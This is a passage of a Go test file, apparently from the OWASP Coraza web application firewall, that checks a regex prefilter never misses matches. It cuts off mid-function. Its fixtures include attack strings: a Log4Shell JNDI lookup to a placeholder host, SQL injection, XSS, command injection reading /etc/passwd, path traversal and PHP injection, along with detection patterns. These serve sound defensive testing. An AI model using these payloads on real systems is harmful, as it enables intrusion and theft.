// Copyright 2022 Juan Pablo Tosso and the OWASP Coraza contributors
// SPDX-License-Identifier: Apache-2.0

//go:build coraza.rule.rx_prefilter

package operators

import (
	"fmt"
	"regexp"
	"strings"
	"testing"

	"github.com/corazawaf/coraza/v3/experimental/plugins/plugintypes"
	"github.com/corazawaf/coraza/v3/internal/corazawaf"
)

func TestMinMatchLength(t *testing.T) {
	tests := []struct {
		pattern string
		want    int
	}{
		// Literals
		{"abc", 3},
		{"", 0},
		{"a", 1},

		// Alternation
		{"a|bc", 1},
		{"abc|de", 2},
		{"abc|defgh|ij", 2},

		// Optional / quantifiers
		{"ab?c", 2},
		{"a+", 1},
		{"a*", 0},
		{"a{3,5}", 3},
		{"a{0,5}", 0},
		{"a{1}", 1},
		{"(ab){2}", 4},

		// Groups
		{"(abc)", 3},
		{"(?:abc)", 3},
		{"((a)(b))", 2},

		// Character classes
		{".", 1},
		{"\\d+", 1},
		{"\\d*", 0},
		{"[a-z]", 1},
		{"[a-z]{3}", 3},

		// Complex patterns
		{"ab(cd|e)fg", 5},
		{"(?i)hello", 5},
		{"hello.*world", 10},
		{"(?:union\\s+select|insert\\s+into)", 11},
		{"sleep\\s*\\(", 6},

		// Anchors (don't consume input)
		{"^abc$", 3},
		{"^$", 0},
		{"\\bhello\\b", 5},

		// Unicode
		{"ハロー", 9}, // 3 runes × 3 bytes each
		{"café", 5},  // é is 2 bytes
	}
	for _, tc := range tests {
		t.Run(tc.pattern, func(t *testing.T) {
			got := minMatchLength(tc.pattern)
			if got != tc.want {
				t.Errorf("minMatchLength(%q) = %d, want %d", tc.pattern, got, tc.want)
			}
		})
	}
}

// TestPrefilterFuncBuildability verifies that prefilterFunc correctly decides
// which patterns can produce a prefilter (non-nil) and which cannot (nil).
// For patterns that produce a prefilter, it also validates that the prefilter
// accepts known matching inputs and rejects known non-matching inputs.
func TestPrefilterFuncBuildability(t *testing.T) {
	tests := []struct {
		pattern   string
		wantNil   bool
		desc      string
		match     string // input that the regex matches (checked when prefilter is non-nil)
		noMatch   string // input that the regex does not match (checked when prefilter is non-nil)
	}{
		{"hello", false, "plain literal", "say hello", "goodbye"},
		{"[a-z]+", true, "char class only", "", ""},
		{"hello.*world", false, "literals around wildcard", "hello big world", "goodbye planet"},
		{"(ab|cd)", false, "alternation with literals", "xabx", "xyz"},
		{".*", true, "pure wildcard", "", ""},
		{"\\d+", true, "digit class", "", ""},
		{"sleep\\s*\\(", false, "literal with optional whitespace", "sleep(1)", "wake(1)"},
		{"(?:union\\s+select|insert\\s+into)", false, "CRS-style alternation", "union select 1", "update set x"},
		{".", true, "single any-char", "", ""},
		{"(a|.)", true, "alternation with wildcard branch", "", ""},
		{"(?:ab|[0-9]+)", true, "alternation where one branch has no literal", "", ""},
		{"(abc)+", false, "repeated literal", "xabcabc", "xyzxyz"},
		{"(abc)?", true, "optional group", "", ""},
		{"(abc)*", true, "zero-or-more group", "", ""},
		{"^hello$", false, "anchored literal", "hello", "world"},
		{"(?i)SELECT", false, "case-insensitive literal", "select", "update"},
	}
	for _, tc := range tests {
		t.Run(tc.desc, func(t *testing.T) {
			pf := prefilterFunc(tc.pattern)
			if tc.wantNil && pf != nil {
				t.Errorf("prefilterFunc(%q) expected nil, got non-nil", tc.pattern)
			}
			if !tc.wantNil && pf == nil {
				t.Errorf("prefilterFunc(%q) expected non-nil, got nil", tc.pattern)
			}
			// When prefilter exists, validate it accepts matching inputs and
			// rejects (or conservatively accepts) non-matching inputs.
			if pf != nil && tc.match != "" {
				if !pf(tc.match) {
					t.Errorf("prefilter(%q) rejected matching input %q — false negative", tc.pattern, tc.match)
				}
			}
			if pf != nil && tc.noMatch != "" {
				re := regexp.MustCompile(tc.pattern)
				if re.MatchString(tc.noMatch) {
					t.Fatalf("test bug: noMatch %q actually matches %q", tc.noMatch, tc.pattern)
				}
				// Prefilter may accept (conservative) or reject — but if it rejects, it's correct
				if pf(tc.noMatch) {
					// Conservative pass-through: prefilter said "maybe", that's OK
				}
			}
		})
	}
}

// TestPrefilterNeverCausesFalseNegatives is the critical safety test.
// For every pattern+input pair where the regex matches, both the minLen check
// and the prefilter must also accept the input. A failure here means the
// prefilter would cause an attack to be missed.
func TestPrefilterNeverCausesFalseNegatives(t *testing.T) {
	tests := []struct {
		pattern string
		input   string
		matches bool
	}{
		// Basic literals
		{"hello", "hello world", true},
		{"hello", "goodbye", false},
		{"hello", "helloworld", true},
		{"hello", "say hello", true},

		// Wildcards between literals
		{"hello.*world", "hello beautiful world", true},
		{"hello.*world", "helloworld", true},
		{"hello.*world", "goodbye", false},

		// CRS-style SQLi alternations
		{"(?:union\\s+select|insert\\s+into)", "union select * from t", true},
		{"(?:union\\s+select|insert\\s+into)", "insert into t values", true},
		{"(?:union\\s+select|insert\\s+into)", "delete from t", false},
		{"(?:union\\s+select|insert\\s+into)", "UNION SELECT", false}, // case-sensitive

		// CRS-style with case-insensitive flag
		{"(?i)(?:union\\s+select|insert\\s+into)", "UNION SELECT * FROM t", true},
		{"(?i)(?:union\\s+select|insert\\s+into)", "Insert Into t values", true},
		{"(?i)(?:union\\s+select|insert\\s+into)", "DELETE FROM t", false},

		// Function call patterns
		{"sleep\\s*\\(", "sleep(5)", true},
		{"sleep\\s*\\(", "sleep  (5)", true},
		{"sleep\\s*\\(", "awake(5)", false},

		// Case-insensitive
		{"(?i)hello", "HELLO", true},
		{"(?i)hello", "Hello", true},
		{"(?i)hello", "hElLo", true},
		{"(?i)hello", "goodbye", false},
		{"(?i)(?:select|union)", "SELECT", true},
		{"(?i)(?:select|union)", "UNION", true},
		{"(?i)(?:select|union)", "Union", true},
		{"(?i)(?:select|union)", "delete", false},

		// Capture groups inside alternation
		{"ab(cd|ef)gh", "abcdgh", true},
		{"ab(cd|ef)gh", "abefgh", true},
		{"ab(cd|ef)gh", "abxxgh", false},

		// Three-way alternation
		{"(?:cat|dog|bird)", "I have a cat", true},
		{"(?:cat|dog|bird)", "I have a dog", true},
		{"(?:cat|dog|bird)", "I have a bird", true},
		{"(?:cat|dog|bird)", "I have a fish", false},

		// Short input rejected by minLen
		{"hello", "hi", false},
		{"hello", "hell", false},
		{"hello", "hello", true},

		// Empty input
		{"hello", "", false},
		{".*", "", true},

		// Input exactly at minLen boundary
		{"abc", "abc", true},
		{"abc", "ab", false},
		{"abc", "xabcx", true},

		// Unicode
		{"ハロー", "ハローワールド", true},
		{"ハロー", "グッバイ", false},
		{"café", "un café chaud", true},
		{"café", "un cafe chaud", false}, // missing accent

		// Anchored patterns
		{"^hello", "hello world", true},
		{"^hello", "say hello", false},
		{"world$", "hello world", true},

		// Nested groups
		{"(a(bc)d)", "abcd", true},
		{"(a(bc)d)", "axd", false},

		// Repeated groups
		{"(ab)+", "ab", true},
		{"(ab)+", "abab", true},
		{"(ab)+", "cd", false},

		// Mixed required + optional parts
		{"hello\\s*world", "helloworld", true},
		{"hello\\s*world", "hello world", true},
		{"hello\\s*world", "goodbye", false},

		// Deeply nested alternation
		{"(?:(?:aa|bb)\\s+(?:cc|dd))", "aa cc", true},
		{"(?:(?:aa|bb)\\s+(?:cc|dd))", "bb dd", true},
		{"(?:(?:aa|bb)\\s+(?:cc|dd))", "aa dd", true},
		{"(?:(?:aa|bb)\\s+(?:cc|dd))", "xx yy", false},

		// Pattern with no extractable literals (prefilter should be nil, regex runs)
		{"[a-z]+\\d+", "abc123", true},
		{"[a-z]+\\d+", "123", false},
		{"\\d{3}-\\d{4}", "555-1234", true},

		// Literal at end after wildcard
		{".*\\.exe", "malware.exe", true},
		{".*\\.exe", "malware.txt", false},
	}
	for _, tc := range tests {
		t.Run(fmt.Sprintf("%s/%s", tc.pattern, tc.input), func(t *testing.T) {
			re := regexp.MustCompile(tc.pattern)
			regexResult := re.MatchString(tc.input)
			if regexResult != tc.matches {
				t.Fatalf("test setup error: regex %q match on %q = %v, expected %v",
					tc.pattern, tc.input, regexResult, tc.matches)
			}

			ml := minMatchLength(tc.pattern)
			if regexResult && len(tc.input) < ml {
				t.Errorf("FALSE NEGATIVE: minMatchLength(%q)=%d rejects matching input %q (len=%d)",
					tc.pattern, ml, tc.input, len(tc.input))
			}

			pf := prefilterFunc(tc.pattern)
			if pf != nil && regexResult && !pf(tc.input) {
				t.Errorf("FALSE NEGATIVE: prefilter(%q) returned false for matching input %q",
					tc.pattern, tc.input)
			}
		})
	}
}

// TestPrefilterCRSPatterns tests against real-world CRS (OWASP Core Rule Set) patterns.
// These are representative patterns from common CRS rules that @rx evaluates.
func TestPrefilterCRSPatterns(t *testing.T) {
	tests := []struct {
		name    string
		pattern string
		input   string
		matches bool
	}{
		// Log4Shell (CVE-2021-44228) detection pattern
		{
			name:    "log4shell_match",
			pattern: `(?i)(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)(?:[^\}]{0,15}(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)|jndi|ctx)`,
			input:   "${jndi:ldap://evil.com/a}",
			matches: true,
		},
		{
			name:    "log4shell_no_match",
			pattern: `(?i)(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)(?:[^\}]{0,15}(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)|jndi|ctx)`,
			input:   "GET /index.html HTTP/1.1",
			matches: false,
		},
		// SQL injection keywords
		{
			name:    "sqli_union_select",
			pattern: `(?i)(?:union\s+(?:all\s+)?select)`,
			input:   "1 UNION ALL SELECT * FROM users",
			matches: true,
		},
		{
			name:    "sqli_union_select_benign",
			pattern: `(?i)(?:union\s+(?:all\s+)?select)`,
			input:   "trade union membership",
			matches: false,
		},
		// XSS patterns
		{
			name:    "xss_script_tag",
			pattern: `(?i)<script[^>]*>`,
			input:   `<script>alert(1)</script>`,
			matches: true,
		},
		{
			name:    "xss_script_tag_benign",
			pattern: `(?i)<script[^>]*>`,
			input:   "just a normal paragraph",
			matches: false,
		},
		// Command injection
		{
			name:    "cmdi_match",
			pattern: `(?:;|\|)\s*(?:cat|ls|id|whoami|passwd)`,
			input:   "; cat /etc/passwd",
			matches: true,
		},
		{
			name:    "cmdi_benign",
			pattern: `(?:;|\|)\s*(?:cat|ls|id|whoami|passwd)`,
			input:   "catalog items for sale",
			matches: false,
		},
		// Path traversal
		{
			name:    "path_traversal_match",
			pattern: `(?:(?:\.{2}[/\\]){3,})`,
			input:   "../../../etc/passwd",
			matches: true,
		},
		{
			name:    "path_traversal_benign",
			pattern: `(?:(?:\.{2}[/\\]){3,})`,
			input:   "/normal/path/to/file",
			matches: false,
		},
		// PHP injection
		{
			name:    "php_injection_match",
			pattern: `(?i)<\?(?:php|=)`,
			input:   `<?php echo "pwned"; ?>`,
			matches: true,
		},
		{
			name:    "php_injection_benign",
			pattern: `(?i)<\?(?:php|=)`,
			input:   "just some text",
			matches: false,
		},
		// HTTP response splitting
		{
			name:    "response_splitting_match",
			pattern: `[\r\n]\s*(?:content-(?:type|length)|set-cookie|location)\s*:`,
			input:   "\r\ncontent-type: text/html",
			matches: true,
		},
		{
			name:    "response_splitting_benign",
			pattern: `[\r\n]\s*(?:content-(?:type|length)|set-cookie|location)\s*:`,
			input:   "normal request body",
			matches: false,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			re := regexp.MustCompile(tc.pattern)
			regexResult := re.MatchString(tc.input)
			if regexResult != tc.matches {
				t.Fatalf("test setup error: regex %q match on %q = %v, expected %v",
					tc.pattern, tc.input, regexResult, tc.matches)
			}

			ml := minMatchLength(tc.pattern)
			if regexResult && len(tc.input) < ml {
				t.Errorf("FALSE NEGATIVE: minMatchLength(%q)=%d rejects matching input %q (len=%d)",
					tc.pattern, ml, tc.input, len(tc.input))
			}

			pf := prefilterFunc(tc.pattern)
			if pf != nil && regexResult && !pf(tc.input) {
				t.Errorf("FALSE NEGATIVE: prefilter(%q) returned false for matching input %q",
					tc.pattern, tc.input)
			}
		})
	}
}

// TestPrefilterCaseInsensitive tests case-insensitive handling in detail.
func TestPrefilterCaseInsensitive(t *testing.T) {
	tests := []struct {
		name    string
		pattern string
		input   string
		want    bool // expected prefilter result (true = might match)
	}{
		// Basic (?i) flag
		{"ci_upper", "(?i)hello", "HELLO WORLD", true},
		{"ci_mixed", "(?i)hello", "HeLLo", true},
		{"ci_lower", "(?i)hello", "hello", true},
		{"ci_nomatch", "(?i)hello", "goodbye", false},

		// Case-sensitive (no flag)
		{"cs_exact", "hello", "hello", true},
		{"cs_upper_reject", "hello", "HELLO", false},

		// (?i) with alternation
		{"ci_alt_first", "(?i)(?:select|insert)", "SELECT", true},
		{"ci_alt_second", "(?i)(?:select|insert)", "INSERT", true},
		{"ci_alt_mixed", "(?i)(?:select|insert)", "SeLeCt", true},
		{"ci_alt_nomatch", "(?i)(?:select|insert)", "DELETE", false},

		// (?i) with concatenation
		{"ci_concat", "(?i)hello.*world", "HELLO beautiful WORLD", true},
		{"ci_concat_nomatch", "(?i)hello.*world", "GOODBYE", false},

		// Partial (?i) — flag applies to subexpression only, but our implementation
		// conservatively treats the whole pattern as case-insensitive. This means
		// the prefilter may accept more inputs than it should (safe, not a false negative).
		{"partial_ci_match", "hello(?i:world)", "helloWORLD", true},
		{"partial_ci_conservative", "hello(?i:world)", "HELLOworld", true}, // conservative: prefilter may accept
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			pf := prefilterFunc(tc.pattern)
			if pf == nil {
				// No prefilter built — always considered "might match", skip this test
				return
			}
			got := pf(tc.input)

			// For safety: if the regex matches, the prefilter MUST return true.
			re := regexp.MustCompile(tc.pattern)
			if re.MatchString(tc.input) && !got {
				t.Errorf("FALSE NEGATIVE: prefilter(%q) returned false for matching input %q", tc.pattern, tc.input)
			}

			// If we have an expected value and the regex doesn't match, check filtering.
			if !re.MatchString(tc.input) && got != tc.want {
				// This is not a correctness failure — the prefilter being too conservative
				// (returning true for non-matching) is fine. Only log if it's unexpectedly
				// rejecting a non-matching input.
				if !got && tc.want {
					t.Errorf("prefilter(%q) unexpectedly rejected non-matching input %q", tc.pattern, tc.input)
				}
			}
		})
	}
}

// TestPrefilterIntegrationViaNewRX verifies the full pipeline: newRX → Evaluate,
// ensuring the prefilter is correctly integrated and doesn't alter matching behavior.
func TestPrefilterIntegrationViaNewRX(t *testing.T) {
	tests := []struct {
		pattern string
		input   string
		want    bool
	}{
		// Patterns that get prefilters
		{"hello.*world", "hello beautiful world", true},
		{"hello.*world", "goodbye universe", false},
		{"som(.*)ta", "somedata", true},
		{"som(.*)ta", "notdata", false},

		// Case-insensitive via newRX (gets (?sm) or (?s) prefix)
		{"(?i)hello", "HELLO", true},
		{"(?i)hello", "goodbye", false},

		// Alternation
		{"(?:union|select)", "test union test", true},
		{"(?:union|select)", "test delete test", false},

		// Patterns that should NOT get prefilters (pure wildcards)
		{"[a-z]+", "abc", true},
		{"[a-z]+", "123", false},
		{".*", "anything", true},
		{".*", "", true},

		// Short inputs rejected by minLen
		{"hello.*world", "hi", false},

		// Empty input
		{"hello", "", false},

		// Unicode
		{"ハロー", "ハローワールド", true},
		{"ハロー", "グッバイ", false},
	}

	for _, tc := range tests {
		t.Run(fmt.Sprintf("%s/%s", tc.pattern, tc.input), func(t *testing.T) {
			opts := plugintypes.OperatorOptions{Arguments: tc.pattern}
			op, err := newRX(opts)
			if err != nil {
				t.Fatal(err)
			}

			waf := corazawaf.NewWAF()
			tx := waf.NewTransaction()
			tx.Capture = true
			got := op.Evaluate(tx, tc.input)
			if got != tc.want {
				t.Errorf("Evaluate(%q, %q) = %v, want %v", tc.pattern, tc.input, got, tc.want)
			}
		})
	}
}

// TestPrefilterCapturingCorrectness verifies that the FindStringSubmatchIndex
// path produces the same capture groups as the original FindStringSubmatch path.
func TestPrefilterCapturingCorrectness(t *testing.T) {
	tests := []struct {
		pattern  string
		input    string
		captures map[int]string // expected capture group index → value
	}{
		{
			pattern:  "som(.*)ta",
			input:    "somedata",
			captures: map[int]string{0: "somedata", 1: "eda"},
		},
		{
			pattern:  "(a)(b)(c)",
			input:    "abc",
			captures: map[int]string{0: "abc", 1: "a", 2: "b", 3: "c"},
		},
		{
			pattern:  "(foo)(bar)?",
			input:    "foo",
			captures: map[int]string{0: "foo", 1: "foo", 2: ""}, // group 2 not in match
		},
		{
			pattern:  "^/api/v(\\d+)",
			input:    "/api/v3/users",
			captures: map[int]string{0: "/api/v3", 1: "3"},
		},
		{
			pattern:  "(a|b)(c|d)",
			input:    "bd",
			captures: map[int]string{0: "bd", 1: "b", 2: "d"},
		},
	}

	for _, tc := range tests {
		t.Run(tc.pattern, func(t *testing.T) {
			opts := plugintypes.OperatorOptions{Arguments: tc.pattern}
			op, err := newRX(opts)
			if err != nil {
				t.Fatal(err)
			}

			waf := corazawaf.NewWAF()
			tx := waf.NewTransaction()
			tx.Capture = true
			got := op.Evaluate(tx, tc.input)
			if !got {
				t.Fatalf("expected match for %q on %q", tc.pattern, tc.input)
			}

			for idx, want := range tc.captures {
				collected := tx.Variables().TX().Get(fmt.Sprintf("%d", idx))
				if len(collected) == 0 {
					t.Errorf("capture group %d: expected %q, got nothing", idx, want)
					continue
				}
				if collected[0] != want {
					t.Errorf("capture group %d: expected %q, got %q", idx, want, collected[0])
				}
			}
		})
	}
}

func TestContainsFoldASCII(t *testing.T) {
	tests := []struct {
		s, needle string
		want      bool
	}{
		{"HELLO WORLD", "hello", true},
		{"Hello World", "hello", true},
		{"goodbye", "hello", false},
		{"", "hello", false},
		{"hi", "hello", false},
		{"xhellox", "hello", true},
		{"HÉLLO", "hello", false},       // non-ASCII É in haystack, ASCII needle
		{"Straße", "straße", true},      // non-ASCII needle: conservative true to avoid false negatives
		{"STRASSE", "straße", true},     // non-ASCII needle: conservative true (Unicode folding is tricky)
		{"totally different", "straße", true}, // non-ASCII needle: conservative true even when absent
		{"", "", true},                  // empty needle always matches
		{"abc", "", true},
		{"SELECT", "select", true},
		{"sElEcT", "select", true},
	}
	for _, tc := range tests {
		t.Run(fmt.Sprintf("%s/%s", tc.s, tc.needle), func(t *testing.T) {
			got := containsFoldASCII(tc.s, tc.needle)
			if got != tc.want {
				t.Errorf("containsFoldASCII(%q, %q) = %v, want %v", tc.s, tc.needle, got, tc.want)
			}
		})
	}
}

// TestBinaryRXBypassesPrefilter verifies that patterns containing non-UTF8 byte
// sequences (e.g. \xac\xed\x00\x05) go through the binaryRX path and do NOT
// get a prefilter attached. This is critical because rxprefilter.go only handles
// standard regexp.Regexp, not binaryregexp.Regexp.
func TestBinaryRXBypassesPrefilter(t *testing.T) {
	tests := []struct {
		name    string
		pattern string
		input   string
		want    bool
	}{
		{
			name:    "binary_match",
			pattern: `\xac\xed\x00\x05`,
			input:   "\xac\xed\x00\x05t\x00\x04test",
			want:    true,
		},
		{
			name:    "binary_no_match",
			pattern: `\xac\xed\x00\x05`,
			input:   "\xac\xed\x00t\x00\x04test",
			want:    false,
		},
		{
			name:    "binary_match_2",
			pattern: `\xff\xfe`,
			input:   "\xff\xfedata",
			want:    true,
		},
		{
			name:    "binary_no_match_2",
			pattern: `\xff\xfe`,
			input:   "normal text",
			want:    false,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			opts := plugintypes.OperatorOptions{Arguments: tc.pattern}
			op, err := newRX(opts)
			if err != nil {
				t.Fatal(err)
			}

			// Verify it's a binaryRX, not an rx with prefilter
			if _, ok := op.(*binaryRX); !ok {
				t.Fatalf("expected binaryRX for pattern %q, got %T", tc.pattern, op)
			}

			waf := corazawaf.NewWAF()
			tx := waf.NewTransaction()
			tx.Capture = true
			got := op.Evaluate(tx, tc.input)
			if got != tc.want {
				t.Errorf("Evaluate(%q, %q) = %v, want %v", tc.pattern, tc.input, got, tc.want)
			}
		})
	}
}

// TestPrefilterWithSMPrefix verifies that the (?sm) or (?s) prefix that newRX
// prepends to every pattern does not break the prefilter. The prefilterFunc
// receives the full prefixed pattern, and it must still extract correct literals
// and not cause false negatives.
func TestPrefilterWithSMPrefix(t *testing.T) {
	tests := []struct {
		name    string
		pattern string
		input   string
		want    bool
	}{
		// (?sm) prefix: dotall + multiline. The pattern "hello.*world" should
		// still match across newlines, and the prefilter should still require
		// both "hello" and "world".
		{
			name:    "dotall_match",
			pattern: "hello.*world",
			input:   "hello\nworld",
			want:    true,
		},
		{
			name:    "dotall_no_match",
			pattern: "hello.*world",
			input:   "goodbye\nuniverse",
			want:    false,
		},
		// Multiline: ^ matches at line start
		{
			name:    "multiline_anchor",
			pattern: "^hello.*world",
			input:   "test\nhello\nworld",
			want:    true,
		},
		// User-supplied (?i) combined with the automatic (?sm)
		{
			name:    "user_ci_with_sm_match",
			pattern: "(?i)hello.*world",
			input:   "HELLO\nWORLD",
			want:    true,
		},
		{
			name:    "user_ci_with_sm_no_match",
			pattern: "(?i)hello.*world",
			input:   "GOODBYE\nUNIVERSE",
			want:    false,
		},
		// Double (?sm) — user passes (?sm) and newRX also prepends it
		{
			name:    "double_sm",
			pattern: "(?sm)hello.*world",
			input:   "hello\nworld",
			want:    true,
		},
		// CRS-style pattern through newRX with automatic prefix
		{
			name:    "crs_sqli_via_newrx",
			pattern: "(?:union\\s+select|insert\\s+into)",
			input:   "union select * from t",
			want:    true,
		},
		{
			name:    "crs_sqli_via_newrx_no_match",
			pattern: "(?:union\\s+select|insert\\s+into)",
			input:   "just normal text",
			want:    false,
		},
		// Alternation with (?i) through full pipeline
		{
			name:    "ci_alternation_via_newrx",
			pattern: "(?i)(?:select|union|insert)",
			input:   "SELECT",
			want:    true,
		},
		{
			name:    "ci_alternation_via_newrx_no_match",
			pattern: "(?i)(?:select|union|insert)",
			input:   "DELETE",
			want:    false,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			opts := plugintypes.OperatorOptions{Arguments: tc.pattern}
			op, err := newRX(opts)
			if err != nil {
				t.Fatal(err)
			}

			// Verify this goes through the rx path (not binaryRX)
			rxOp, ok := op.(*rx)
			if !ok {
				t.Fatalf("expected *rx for pattern %q, got %T", tc.pattern, op)
			}

			// Verify the prefilter doesn't cause false negatives
			waf := corazawaf.NewWAF()
			tx := waf.NewTransaction()
			tx.Capture = true
			got := rxOp.Evaluate(tx, tc.input)
			if got != tc.want {
				t.Errorf("Evaluate(%q, %q) = %v, want %v", tc.pattern, tc.input, got, tc.want)
			}
		})
	}
}

// TestMemoizeSharesPrefilter verifies that two newRX calls with the same pattern
// produce operators with identical compiled artifacts. When the memoize_builders
// build tag is active, they share the same pointer; without it, they are distinct
// but behaviorally equivalent.
func TestMemoizeSharesPrefilter(t *testing.T) {
	pattern := "hello.*world"
	opts := plugintypes.OperatorOptions{Arguments: pattern}

	op1, err := newRX(opts)
	if err != nil {
		t.Fatal(err)
	}
	op2, err := newRX(opts)
	if err != nil {
		t.Fatal(err)
	}

	rx1 := op1.(*rx)
	rx2 := op2.(*rx)

	// Both should have the same minLen
	if rx1.minLen != rx2.minLen {
		t.Errorf("minLen mismatch: %d vs %d", rx1.minLen, rx2.minLen)
	}

	// Both should have the same regex pattern
	if rx1.re.String() != rx2.re.String() {
		t.Errorf("regex pattern mismatch: %q vs %q", rx1.re.String(), rx2.re.String())
	}

	// Both should produce the same evaluation results
	inputs := []string{"hello beautiful world", "goodbye", "", "hello world"}
	for _, inp := range inputs {
		waf := corazawaf.NewWAF()
		tx1 := waf.NewTransaction()
		tx1.Capture = true
		tx2 := waf.NewTransaction()
		tx2.Capture = true

		r1 := rx1.Evaluate(tx1, inp)
		r2 := rx2.Evaluate(tx2, inp)
		if r1 != r2 {
			t.Errorf("input %q: op1=%v, op2=%v", inp, r1, r2)
		}
	}
}

// TestPrefilterConcurrentSafety verifies the prefilter closure and Aho-Corasick
// automaton can be safely called from multiple goroutines concurrently.
func TestPrefilterConcurrentSafety(t *testing.T) {
	pattern := "(?i)(?:union\\s+select|insert\\s+into|delete\\s+from)"
	opts := plugintypes.OperatorOptions{Arguments: pattern}
	op, err := newRX(opts)
	if err != nil {
		t.Fatal(err)
	}

	inputs := []string{
		"union select * from t",
		"INSERT INTO t VALUES",
		"normal request",
		"GET /index.html HTTP/1.1",
		"delete from users",
		"",
		"UNION SELECT 1,2,3",
	}

	// Run 100 goroutines, each evaluating all inputs
	const goroutines = 100
	errs := make(chan error, goroutines*len(inputs))
	done := make(chan struct{})

	for g := 0; g < goroutines; g++ {
		go func() {
			for _, inp := range inputs {
				waf := corazawaf.NewWAF()
				tx := waf.NewTransaction()
				tx.Capture = true
				got := op.Evaluate(tx, inp)

				// Cross-check against direct regex
				re := regexp.MustCompile("(?i)(?:union\\s+select|insert\\s+into|delete\\s+from)")
				want := re.MatchString(inp)
				if got != want {
					errs <- fmt.Errorf("input %q: concurrent Evaluate=%v, regex=%v", inp, got, want)
				}
			}
			done <- struct{}{}
		}()
	}

	for g := 0; g < goroutines; g++ {
		<-done
	}
	close(errs)

	for err := range errs {
		t.Error(err)
	}
}

// FuzzPrefilterNoFalseNegatives uses Go's built-in fuzz testing to verify with
// random patterns AND inputs that the prefilter never rejects an input the
// regex matches. This is the primary safety net — it generates arbitrary
// regex patterns that the fuzzer evolves to maximize code coverage.
// Run with: go test -tags coraza.rule.rx_prefilter -fuzz=FuzzPrefilterNoFalseNegatives -fuzztime=60s
func FuzzPrefilterNoFalseNegatives(f *testing.F) {
	// Seed corpus with CRS-representative patterns and realistic inputs.
	patterns := []string{
		// Simple
		"hello",
		"hello.*world",
		"(?i)hello",
		// CRS-style SQLi
		"(?:union|select|insert)",
		"(?i)(?:union\\s+select|insert\\s+into)",
		"(?i)(?:union\\s+(?:all\\s+)?select)",
		// CRS-style command injection
		"(?:;|\\|)\\s*(?:cat|ls|id|whoami)",
		// CRS-style XSS
		"(?i)<script[^>]*>",
		"(?i)(?:on(?:error|load|click)\\s*=)",
		// Function calls
		"sleep\\s*\\(",
		// Nested alternation (found by prior fuzzing)
		"10|(10|00)",
		"(a|b)|(c|d)",
		"(?:(?:aa|bb)|(?:cc|dd))",
		// Complex nesting
		"ab(cd|ef)gh",
		"(?:cat|dog|bird)",
		// Path traversal
		"(?:\\.{2}[/\\\\]){2,}",
		// Anchored
		"^hello$",
		"\\bhello\\b",
		// Repetition
		"(ab)+",
		"(abc){2,4}",
		// Optional parts
		"hello\\s*world",
		"(?:foo)?bar",
		// Character classes with literals
		"[a-z]+test",
		"test[0-9]+end",
		// Unicode
		"ハロー",
		"café",
	}
	inputs := []string{
		// Benign traffic
		"GET /index.html HTTP/1.1",
		"POST /api/v1/users HTTP/1.1",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
		"just a normal string with spaces",
		// Attack payloads
		"union select * from users--",
		"UNION ALL SELECT 1,2,3",
		"insert into t values(1)",
		"INSERT INTO t VALUES(1)",
		"; cat /etc/passwd",
		"| ls -la /",
		"sleep(5)",
		"<script>alert(1)</script>",
		"<SCRIPT>alert(document.cookie)</SCRIPT>",
		"onerror=alert(1)",
		"../../../etc/passwd",
		"${jndi:ldap://evil.com/a}",
		"<?php echo 'pwned'; ?>",
		"\r\ncontent-type: text/html",
		// Edge cases
		"",
		"x",
		"00",
		"10",
		"hello",
		"HELLO",
		"hElLo",
		"hello world",
		"helloworld",
		"abcdgh",
		"abefgh",
		strings.Repeat("a", 100),
		strings.Repeat("ab", 50),
		// Unicode
		"ハローワールド",
		"un café chaud",
	}
	for _, p := range patterns {
		for _, inp := range inputs {
			f.Add(p, inp)
		}
	}

	f.Fuzz(func(t *testing.T, pattern, input string) {
		// Cap lengths to avoid expensive regex evaluations that stall the fuzzer.
		if len(pattern) > 256 || len(input) > 512 {
			return
		}

		// Skip invalid regex patterns
		re, err := regexp.Compile(pattern)
		if err != nil {
			return
		}

		regexMatches := re.MatchString(input)

		ml := minMatchLength(pattern)
		if regexMatches && len(input) < ml {
			t.Errorf("FALSE NEGATIVE via minLen: pattern=%q input=%q (len=%d, minLen=%d)",
				pattern, input, len(input), ml)
		}

		pf := prefilterFunc(pattern)
		if pf != nil && regexMatches && !pf(input) {
			t.Errorf("FALSE NEGATIVE via prefilter: pattern=%q input=%q",
				pattern, input)
		}
	})
}

// FuzzPrefilterFixedCRSPatterns fuzzes with fixed CRS-representative patterns
// against random inputs. This simulates real-world usage: the patterns are
// known at compile time (from CRS rules), the inputs are arbitrary user traffic.
// Run with: go test -tags coraza.rule.rx_prefilter -fuzz=FuzzPrefilterFixedCRSPatterns -fuzztime=60s
func FuzzPrefilterFixedCRSPatterns(f *testing.F) {
	f.Add("normal request data")
	f.Add("union select * from users")
	f.Add("<script>alert(1)</script>")
	f.Add("sleep(5)")
	f.Add("../../../etc/passwd")
	f.Add("")
	f.Add("x")
	f.Add(strings.Repeat("union", 20))
	f.Add("UNION SELECT")
	f.Add("' OR '1'='1")
	f.Add("${jndi:ldap://x}")
	f.Add("\r\nSet-Cookie: evil=1")

	// Fixed patterns representative of real CRS rules
	crsPatterns := []string{
		`(?i)(?:union\s+(?:all\s+)?select)`,
		`(?i)(?:insert\s+into|delete\s+from|update\s+\w+\s+set)`,
		`(?i)<script[^>]*>`,
		`(?i)(?:on(?:error|load|click|mouse\w+)\s*=)`,
		`(?:;|\|)\s*(?:cat|ls|id|whoami|passwd)`,
		`sleep\s*\(`,
		`(?i)(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)(?:[^\}]{0,15}(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)|jndi|ctx)`,
		`[\r\n]\s*(?:content-(?:type|length)|set-cookie|location)\s*:`,
		`(?i)<\?(?:php|=)`,
		`(?:\.{2}[/\\]){3,}`,
		`(?i)(?:exec|system|passthru|popen|proc_open)\s*\(`,
		`hello.*world`,
		`(?:union|select|insert|delete|update|drop|alter|create)`,
	}

	// Precompile all patterns and their prefilters
